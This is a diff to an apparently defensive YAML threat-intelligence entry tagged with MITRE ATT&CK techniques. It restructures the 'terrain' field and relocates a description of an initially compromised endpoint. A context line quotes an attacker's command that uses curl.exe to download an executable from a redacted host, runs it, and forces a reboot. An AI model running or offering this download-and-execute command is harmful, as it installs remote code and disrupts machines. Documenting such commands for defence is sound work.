@@ -23,16 +23,10 @@ threat:
     - T1027.013
     - T1027.002
     - T1059.001
-  terrain: |-
-    A threat actor needs an initially compromised end-point. 
-    Example: A threat actor is using Operational Relay Box (ORB)
-    network to gain an initial foothold and access to the victim's
-    environment ref [1].
-
-    Domains: Enterprise
-    Cve: CVE-2024-8963, CVE-2024-8190
-    Targets: Customer, Laptop, Workstations
-    Platforms: Windows
+  terrain:
+    - Windows
+    - Customer Support
+    - Windows::Desktop
   severity: Moderate incident
   leverage: Infrastructure Compromise; Elevation of privilege; Information Disclosure; Tampering
   impact: Impairement; Business disruption; Lose Capabilities
@@ -134,3 +128,8 @@ threat:
      sleep 60;curl.exe -o c:\programdata\AppSov.EXE http://[REDACTED]/dompdf/x.dat;start-process c:\programdata\AppSov.EXE;sleep 1800;shutdown.exe -r -t 1 -f;
      
      ```
+
+    A threat actor needs an initially compromised end-point. 
+    Example: A threat actor is using Operational Relay Box (ORB)
+    network to gain an initial foothold and access to the victim's
+    environment ref [1].
